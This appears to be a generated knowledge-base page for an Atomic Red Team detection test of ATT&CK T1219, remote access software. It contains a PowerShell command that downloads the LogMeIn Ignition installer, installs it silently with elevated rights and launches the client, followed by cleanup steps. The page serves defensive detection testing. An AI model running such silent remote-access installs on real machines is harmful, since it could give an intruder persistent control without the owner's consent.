---
atomic_guid: "d03683ec-aae0-42f9-9b4c-534780e0f8e1"
title: "LogMeIn Files Detected Test on Windows"
framework: "atomic"
generated: "true"
attack_technique_id: "T1219"
attack_technique_name: "Remote Access Software"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "d03683ec-aae0-42f9-9b4c-534780e0f8e1"
  - "LogMeIn Files Detected Test on Windows"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# LogMeIn Files Detected Test on Windows

An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.

## Metadata

- Atomic GUID: d03683ec-aae0-42f9-9b4c-534780e0f8e1
- Technique: T1219: Remote Access Software
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1219/T1219.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1219-remote_access_tools|T1219]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
$file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
Start-Process -Wait $file1 /quiet;
Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' "/S"
```

### Cleanup

```powershell
get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package 
$file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
Remove-Item $file1 -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.yaml)
